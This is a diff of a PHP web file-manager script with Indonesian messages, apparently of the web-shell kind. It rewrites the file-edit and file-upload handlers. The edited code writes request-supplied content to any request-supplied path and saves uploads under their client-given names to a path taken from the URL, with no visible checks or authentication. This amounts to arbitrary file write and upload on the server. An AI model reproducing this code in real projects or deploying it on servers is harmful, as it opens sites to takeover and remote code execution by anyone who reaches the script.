@@ -137,15 +137,6 @@ function deleteFolder($dirnya) {
     return rmdir($dirnya);
 }
 
-function uploadFile($fileSementara, $fileUpload) {
-	$terupload = move_uploaded_file($fileSementara, $fileUpload);
-	if($terupload) {
-		return true;
-	}else {
-		return false;
-	}
-}
-
 function folder_exist($folder)
 {
     $path = realpath($folder);
@@ -176,19 +167,26 @@ if(isset($_GET['path'])) {
 }
 
 if(isset($_POST['pilihan'])) {
-	switch ($_POST['pilihan']) {
-		case $_POST['pilihan'] == 'edit':
-			$edit = true;
-			$dirFile = $_POST['dir'];
-			$sourceFile = $_POST['sourceFile'];
-			if(!empty($sourceFile)){
-				if(file_put_contents($dirFile, $sourceFile)) {
-					$successEdit = 'Berhasil di edit';
-				}else {
-					$successEdit = 'Gagal edit';					
-				}
-			}
-			break;
+    switch ($_POST['pilihan']) {
+        case 'edit':
+            $edit = true;
+            $dirFile = $_POST['dir'];
+            $sourceFile = $_POST['sourceFile'];
+            if(!empty($sourceFile)){
+                $fileHandle = fopen($dirFile, 'w');
+                if($fileHandle !== false){
+                    if(fwrite($fileHandle, $sourceFile) !== false) {
+                        fclose($fileHandle);
+                        $successEdit = 'Berhasil di edit';
+                    } else {
+                        fclose($fileHandle);
+                        $successEdit = 'Gagal edit';
+                    }
+                } else {
+                    $successEdit = 'Gagal membuka file untuk diedit';
+                }
+            }
+            break;
 		case $_POST['pilihan'] == 'rename':
 			$rename = true;
 			$dirFile = $_POST['dir'];
@@ -291,8 +289,13 @@ if(isset($_POST['pilihan'])) {
 				$path = $_GET['path'];
 			}
 
-			if(!empty($_FILES)) {
-				if(uploadFile($_FILES['uploadFile']['tmp_name'], $path . '/' . $_FILES['uploadFile']['name'])) {
+			if(isset($_FILES['uploadFile'])) {
+				$namafile = $_FILES['uploadFile']['name'];
+				$tempatfile = $_FILES['uploadFile']['tmp_name'];
+				$error = $_FILES['uploadFile']['error'];
+				$ukuranfile = $_FILES['uploadFile']['size'];
+
+				if(move_uploaded_file($tempatfile, $path.'/'.$namafile)) {
 					echo "<script>
 						  alert('File berhasil diupload!!');
 						  window.location.href = window.location.href;
